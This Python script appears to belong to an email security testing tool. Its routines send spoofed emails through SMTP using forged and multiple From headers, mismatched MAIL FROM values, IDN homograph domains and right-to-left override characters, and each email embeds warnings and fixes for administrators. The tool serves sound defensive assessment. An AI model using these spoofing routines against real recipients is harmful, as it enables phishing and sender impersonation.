#!/usr/bin/env python3
# coding:utf8

from util import smtplib
from struct import pack
import string
import time
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from util.log import init_log
from core.SMTP import SendMailDealer
from config import *

rstr = string.ascii_letters + string.digits
RSTR = list(map(lambda x: x.encode(), rstr))  # str --> byte

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = BASE_DIR + '/log/smtp.log'
logger = init_log(LOG_FILE)

template = """---

INFO:

This is an evaluation email sent by EmailTestTool to help email administrators to evaluate and strengthen their security. 

If you see this email, it means that you may are vulnerable to the email spoofing attacks.

This email uses the {attack_name}({number}).

----------------------------------------------------------------------------------------------------

How to fix it:

For the IDN {attack_name}({number}): {defense}

----------------------------------------------------------------------------------------------------

More Details：

More email header details are provided to help you to configure the corresponding email filtering strategy.

"""


def is_bad(s):
    return s not in RSTR


def test_normal(user, passwd, smtp_server, receiveUser, subject, content,
                filename=None, mime_from1=None, mime_from2=None, mail_from=None, image=None, mime_from=None):
    smtp, port = smtp_server.split(":")
    # print(user, passwd, smtp, port, receiveUser, mime_from, subject, content, filename, mime_from1, mime_from2)
    demo = SendMailDealer(user, passwd, smtp, port, filename=filename)
    demo.sendMail(receiveUser, mime_from=mime_from, subject=subject, content=content, mime_from1=mime_from1,
                  mime_from2=mime_from2, mail_from=mail_from, image=image)


def test_mail_mime_attack(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports MIME FROM and MAIL FROM inconsistency
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"The Inconsistency between Mail From and From headers"
    number = "A2"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    domain = user.split('@')[1]
    # mime_from can specify any value you like.
    mime_from = 'admin@' + domain
    defense = '''You should Add a reminder to remind users that the sender is inconsistent with MAIL FROM on UI.'''
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email=to_email, info=info, mime_from=mime_from, subject=subject, content=content)


def test_login_mail_attack(user, passwd, smtp_server, receiverUser):
    """
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiverUser
    info = u"The Inconsistency between Auth username and Mail From headers"
    domain = user.split('@')[1]
    mail_from = 'adm1n@' + domain
    defense = 'Prohibit sending such emails! '
    try:
        demo.sendMail(to_email=to_email, info=info, mail_from=mail_from, subject=info, defense=defense)
    except Exception as e:
        logger.error(e)
        logger.info("attack failed.")
        return False
    logger.info("attack success!")
    return True


def test_mail_mime_chars_attack(user, passwd, smtp_server, receiveUser, special_unicode='\xff'):
    """
    Test whether the smtp server supports different unicode in MIME FROM header
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Missing UI Rendering Attack"
    number  = "A13"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    domain = user.split('@')[1]
    username = user.split('@')[0]
    defense = 'You should reject emails which contains special and not allowed characters in the sender address or add a warning in the UI.'
    mime_from = username + special_unicode + '@' + domain
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email, info=info, mime_from=mime_from, defense=defense,subject=subject,content=content)


def test_multiple_mime_from1(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports multiple MIME FROM headers.(The Specified MIME FROM is above)
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Multiple From Headers Attack"
    number = "A4"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    domain = user.split('@')[1]
    mime_from1 = 'admin@' + domain
    defense = '''You should reject such emails which contain multiple from headers.'''
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email, info=info, mime_from=user, mime_from1=mime_from1,defense=defense,subject=subject,content=content)


def test_multiple_mime_from2(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports multiple MIME FROM headers.(The Specified MIME FROM is below)
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Multiple From Headers Attack"
    number = "A4"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    domain = user.split('@')[1]
    # mime_from2 can specify any value you like.
    mime_from2 = 'admin@' + domain
    defense = '''You should reject such emails which contain multiple from headers.'''
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email, info=info, mime_from=user, mime_from2=mime_from2, defense=defense,subject=subject,content=content)


def test_multiple_value_mime_from1(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports multiple email address in MIME FROM header.(The specified email address is in front)
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Multiple Email Addresses Attack"
    number = "A5"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    domain = user.split('@')[1]
    front_mime_from = 'admin@' + domain
    # mime_from can specify in many different situations such like '<a@a.com>,<b@a.com>','a<a@a.com>,b<b@a.com>',"'a@a.com','b@b.com'" ...
    mime_from = front_mime_from + ',' + user
    defense = '''You should display all sender addresses and remind users that it may be forged emails on UI.'''
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email,subject=subject,mime_from=mime_from, info=info, content=content)


def test_multiple_value_mime_from2(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports multiple email address in MIME FROM header.(The specified email address is at the back)
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Multiple Email Addresses Attack"
    number = "A5"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    domain = user.split('@')[1]
    back_mime_from = 'admin@' + domain
    # mime_from can specify in many different situations such like '<a@a.com>,<b@a.com>','a<a@a.com>,b<b@a.com>',"'a@a.com','b@b.com'" ...
    mime_from = user + ',' + back_mime_from
    defense = '''You should display all sender addresses and remind users that it may be forged emails on UI.'''
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email,subject=subject,mime_from=mime_from, info=info, content=content)


def test_multiple_value_mime_to(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports multiple email address in MIME TO header.
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Test multiple addresses in 'to' filed"
    domain = user.split('@')[1]
    new_mime_to = 'admin@' + domain
    to = user + ',' + new_mime_to
    # MIME TO header can be specified and tested like MIME FROM header
    demo.sendMail(to_email, mime_from=user, info=info, to=to)


def test_mime_to(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports MIME TO and RCPT TO inconsistency
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Test mime to"
    domain = user.split('@')[1]
    to = 'admin@' + domain
    demo.sendMail(to_email, mime_from=user, info=info, to=to)


def test_IDN_mime_from_domain(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports IDN MIME FROM(domain)
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"IDN Homograph Attack"
    number = "A12"
    subject = "[Warning] Maybe you are vulnerable to the A12 attack!"
    # username = user.split('@')[0]
    mime_from = "admin" + "@xn--80aa1cn6g67a.com"
    defense = "You can only display the original address with  Punycode character, if a domain label contains characters from multiple different languages."
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email, info=info, mime_from=mime_from, subject=subject, content=content)


def test_IDN_mime_from_username(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports IDN MIME FROM(user)
    :return:
    """
    smtp, port = smtp_server.split(":")
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"IDN Homograph Attack"
    number = "A12"
    subject = "[Warning] Maybe you are vulnerable to the A12 attack!"
    domain = user.split('@')[1]
    mime_from = 'xn--80aa1cn6g67a@' + domain
    defense = "You can only display the original address with  Punycode character, if a domain label contains characters from multiple different languages."
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email, info=info, mime_from=mime_from, subject=subject, content=content)


def test_reverse_mime_from_user(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports reverse unicode MIME FROM(user)
    :return:
    """
    smtp, port = smtp_server.split(":")
    mime_from = "\u202emoc.qq@\u202d@test.com"
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Right-to-left Override Attack"
    number = "A14"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    defense = 'You should reject emails which contain these special characters in the sender address or add a warning on UI.'
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email, info=info, mime_from=mime_from, subject=subject, content=content)


def test_reverse_mime_from_domain(user, passwd, smtp_server, receiveUser):
    """
    Test whether the smtp server supports reverse unicode MIME FROM(domain)
    :return:
    """
    smtp, port = smtp_server.split(":")
    mime_from = "test@\u202etest.com\u202d"
    demo = SendMailDealer(user, passwd, smtp, port)
    to_email = receiveUser
    info = u"Right-to-left Override Attack"
    number = "A14"
    subject = "[Warning] Maybe you are vulnerable to the %s attack!" % number
    defense = 'You should reject emails which contain these special characters in the sender address or add a warning on UI.'
    content = template.format(attack_name=info, number=number, defense=defense)
    demo.sendMail(to_email, info=info, mime_from=mime_from, subject=subject, content=content)


if __name__ == '__main__':
    """
    Send normal smtp email to receiveUser
    :param user:
    :param passwd:
    :param smtp_server:
    :param receiveUser:
    :param subject:
    :param content: both html and normal text is supported
    :param filename: put Mail attachment into uploads folder and specify 'filename'
    :param image: if you want to add image into email body, you can put "<img src="cid:image1">" in 'content' and specify 'image' like 'filename'
    Other parameters like mail_from,mime_from,mime_from1,mime_from2 can be specified if smtp server allow.
    :return:
    """
    # test_normal(user, passwd, smtp_server, receiveUser, subject, content, mime_from=None, filename=filename,
    #             mime_from1=None, mime_from2=None, mail_from=None, image=image)
    test_mail_mime_attack(user, passwd, smtp_server, receiveUser)
    # test_login_mail_attack(user, passwd, smtp_server, receiveUser)
    # special_unicode = '\xff'
    # test_mail_mime_chars_attack(user, passwd, smtp_server, receiveUser, special_unicode)
    # test_multiple_mime_from1(user, passwd, smtp_server, receiveUser)
    # test_multiple_mime_from2(user, passwd, smtp_server, receiveUser)
    # test_multiple_value_mime_from1(user, passwd, smtp_server, receiveUser)
    # test_multiple_value_mime_from2(user, passwd, smtp_server, receiveUser)
    # test_multiple_value_mime_to(user, passwd, smtp_server, receiveUser)
    # test_mime_to(user, passwd, smtp_server, receiveUser)
    # test_IDN_mime_from_domain(user, passwd, smtp_server, receiveUser)
    # test_IDN_mime_from_username(user, passwd, smtp_server, receiveUser)
    # test_reverse_mime_from_user(user, passwd, smtp_server, receiveUser)
    # test_reverse_mime_from_domain(user, passwd, smtp_server, receiveUser)
